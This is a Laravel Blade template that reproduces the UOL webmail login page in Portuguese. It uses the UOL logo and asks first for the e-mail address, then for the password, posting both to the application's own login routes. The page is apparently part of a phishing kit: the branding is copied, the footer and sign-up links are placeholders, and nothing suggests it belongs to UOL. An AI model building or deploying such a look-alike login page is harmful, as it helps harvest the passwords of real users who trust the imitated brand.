@props(['id' => null])
<x-layouts.guest title="E-mail UOL">
    <div class="w-full max-w-sm rounded-lg border bg-white">
        <div class="flex flex-col gap-1.5 px-6 pb-6 text-center">
            <div class="flex"><img src="{{ asset('logo_uolmail2.png') }}" alt="E-mail UOL" class="h-10"></div>
            <div class="">
                <p class="text-left text-gray-800">Gerencie seus e-mails com a segurança que só o UOL te oferece.</p>
            </div>
        </div>

        <div class="px-6">
            @if ($id)
                <p class="text-xl font-medium text-gray-800">Entrar</p>
                <p class="text-center text-base font-medium text-gray-800">Informe sua senha</p>
                <div class="flex max-h-10 items-center rounded-full border border-gray-300 px-4 py-3 text-sm text-gray-800">
                    <img src="{{ asset('icons_login_usuario.png') }}" width="28px" height="28px" alt="Ícone de usuário">
                    <span class="ml-2 text-gray-800">{{ $id }}</span>
                    <p class="flex-1 cursor-pointer justify-end"><span class="flex justify-end">x</span></p>
                </div>
                <p class="py-2"></p>
                <form method="POST" action="{{ route('login.authenticate') }}" class="space-y-4" data-loading-form>
                    @csrf
                    @method('PUT')
                    <input type="hidden" name="email" value="{{ $id }}">
                    <div class="space-y-2">
                        @if ($errors->has('password'))
                            <div class="flex min-h-16 bg-gray-200 p-2 break-words">
                                <p class="mr-2 size-[22px] min-w-[22px] items-center justify-center rounded-full bg-red-700 text-center text-white">X</p>
                                <strong class="tracking-wide">{{ $errors->first('password') }}</strong>
                            </div>
                        @endif
                        <div class="group relative m-0 p-0">
                            <label for="password" class="absolute top-1/2 left-2 -translate-y-1/2 text-sm text-gray-500 transition-all duration-150 group-focus-within:top-1/3 group-focus-within:left-2 group-focus-within:-translate-y-[80%] group-focus-within:scale-80 group-has-[input:not(:placeholder-shown)]:top-1/3 group-has-[input:not(:placeholder-shown)]:left-2 group-has-[input:not(:placeholder-shown)]:-translate-y-[80%] group-has-[input:not(:placeholder-shown)]:scale-80">Senha</label>
                            <input id="password" name="password" type="password" required placeholder=" "
                                   class="border-input flex h-12 w-full min-w-0 rounded-none border border-gray-300 bg-transparent px-3 py-1 pt-2 pl-3 text-base shadow-xs outline-none placeholder:flex placeholder:p-0 placeholder:text-right placeholder:text-base placeholder:text-gray-400 focus:border focus:border-[#66afe9] focus:shadow-[inset_0_1px_1px_rgba(0,0,0,.075),0_0_8px_rgba(102,175,233,.6)] md:text-sm">
                        </div>
                    </div>
                    <button type="submit" data-submit
                            class="w-full rounded-md bg-[#e29933] px-4 py-3 font-medium text-white transition-colors duration-200 hover:bg-[#d4862e] disabled:opacity-50">Entrar</button>
                </form>
            @else
                <form method="POST" action="{{ route('login.store') }}" class="space-y-4" data-loading-form>
                    @csrf
                    <div class="space-y-2">
                        <p class="text-xl font-medium text-gray-800">Entrar</p>
                        @if ($errors->has('email'))
                            <div class="flex min-h-16 bg-gray-200 p-2 break-words">
                                <p class="mr-2 size-[22px] min-w-[22px] items-center justify-center rounded-full bg-red-700 text-center text-white">X</p>
                                <strong class="tracking-wide">{{ $errors->first('email') }}</strong>
                            </div>
                        @endif
                        <div class="group relative m-0 p-0">
                            <label for="email" class="absolute top-1/2 left-2 -translate-y-1/2 text-sm text-gray-500 transition-all duration-150 group-focus-within:top-1/3 group-focus-within:left-2 group-focus-within:-translate-y-[80%] group-focus-within:scale-80 group-has-[input:not(:placeholder-shown)]:top-1/3 group-has-[input:not(:placeholder-shown)]:left-2 group-has-[input:not(:placeholder-shown)]:-translate-y-[80%] group-has-[input:not(:placeholder-shown)]:scale-80">E-mail</label>
                            <input id="email" name="email" type="email" placeholder="@uol.com.br" value="{{ old('email') }}" required
                                   class="border-input flex h-12 w-full min-w-0 rounded-none border border-gray-300 bg-transparent px-3 py-1 pt-2 pl-3 text-base shadow-xs outline-none placeholder:flex placeholder:p-0 placeholder:text-right placeholder:text-base placeholder:text-gray-400 focus:border focus:border-[#66afe9] focus:shadow-[inset_0_1px_1px_rgba(0,0,0,.075),0_0_8px_rgba(102,175,233,.6)] md:text-sm">
                        </div>
                    </div>
                    <button type="submit" data-submit
                            class="w-full rounded-md bg-[#e29933] px-4 py-3 font-medium text-white transition-colors duration-200 hover:bg-[#d4862e] disabled:opacity-50">Continuar</button>
                </form>
            @endif
        </div>

        <div class="flex flex-col items-center space-y-3 px-6 pt-4">
            <div class="text-center">
                <p class="text-sm text-gray-600">Ainda não tem e-mail UOL?
                    <a href="" class="font-medium text-[#1082be] hover:text-blue-500" target="_blank" rel="noopener noreferrer">ASSINE JÁ</a>
                </p>
                <p class="mt-2 text-sm text-[#1082be] hover:text-blue-500"><a href="#" class="transition-colors">Esqueceu a senha?</a></p>
            </div>
        </div>
    </div>

    <div class="mt-8 max-w-md space-y-2 text-center text-xs text-gray-500">
        <p>Sua senha é secreta.</p>
        <p>Nenhum funcionário a serviço do UOL está autorizado a solicitá-la</p>
        <div class="flex justify-center space-x-4">
            <a href="#" class="text-blue-600 hover:text-blue-800">Regras de uso</a>
            <a href="#" class="text-blue-600 hover:text-blue-800">Política anti-spam</a>
            <a href="#" class="text-blue-600 hover:text-blue-800">Crimes virtuais: denuncie</a>
        </div>
    </div>
</x-layouts.guest>
